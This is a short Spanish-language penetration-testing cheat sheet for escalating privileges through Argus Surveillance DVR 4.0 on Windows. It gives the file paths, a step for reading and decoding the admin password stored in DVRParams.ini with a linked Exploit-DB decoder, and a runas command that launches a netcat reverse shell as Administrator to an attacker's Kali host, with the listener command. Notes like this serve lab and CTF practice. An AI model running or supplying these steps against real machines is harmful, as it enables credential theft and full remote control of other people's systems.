# Argus Surveillance DVR 4.0

Tags: #PrivEsc #DVR4 


```bash 
# Ruta:
	+ C:\ProgramData\PY_Software\Argus Surveillance DVR\
	- C:\Program Files\Argus Surveillance DVR\
	  
# Archivos:
	+ DVRParams.ini
	- CommonSettings.ini
	- Viewer.ini
```

## Weak Password Encryption

* [Weak Password Encryption](https://www.exploit-db.com/exploits/50130)

```bash 
Paso 1:
# Buscar la password del usuario admin 
❯ type 'C:\ProgramData\PY_Software\Argus Surveillance DVR\DVRParams.ini'

# Buscar:
	Password0=ECB453D16069F641E03BD9BD956BFE36BD8F3CD9D9A8

Paso 2:
# Agregar lo siguiente al exploit:
	'F79A':'*','ECEC':'_','AF71':'~','78A7':'@','E06F':'`','D9A8':'$'

Paso 3:
# Decifrarla utilizando el exploit 
# Modificar el exploit agregando la password dentro para el descifrado
❯ python3 argus_decode.py
```

```bash 
Paso 4:
# Ejecutar la revershell
# Se debe tener la password del usuario 'Administrator'
❯ runas /user:Administrator "C:\Users\user\nc.exe IP_Kali 443 -e cmd.exe"
	# user = Usuario que ejecutará el comando

❯ rlwrap nc -nlvp 443   # Recibir en Kali  
```